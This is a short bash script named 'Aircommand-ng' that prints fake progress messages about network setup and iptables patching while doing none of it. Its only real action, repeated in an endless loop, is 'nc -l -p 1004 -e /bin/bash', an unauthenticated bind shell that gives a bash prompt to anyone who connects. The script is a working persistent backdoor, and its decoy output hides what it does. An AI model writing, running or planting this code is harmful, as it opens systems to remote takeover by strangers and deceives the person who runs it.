#!/bin/bash
echo "[+] Aircommand-ng v0.9.1 by elogada (c)2018, all deps not mine"
sleep 3
echo "[+] Initiating script for the first time..."
echo "[!] Please wait while script is readied..."
sleep 3
echo "[ ok ] Script for init..."
echo "[ ok ] Network for init..."
sleep 3
while [ 1=1 ]
do
        echo "[+] Listener seems closed."
        sleep 1
        echo "[!] Establishing network connections... Please wait..."
        echo "[ ok ] Networking stage finished."
        echo "[!] Please check if it failed."
        echo "[+] Patching IPTables to open appropriate ports..."
        sleep 1
        echo "[ ok ] Port open stage finished."
        echo "[!] NONE OF THIS IS FAILSAFE."
        echo "[ ok ] Connection ready!"
        nc -l -p 1004 -e /bin/bash
        echo "[!] Connection closed!"
        echo "[+] Attempting to restart metadaemon..."
        sleep 3
        echo ""
        echo "[ ok ] Aircommand-ng ready for rebump!"
done
~                              
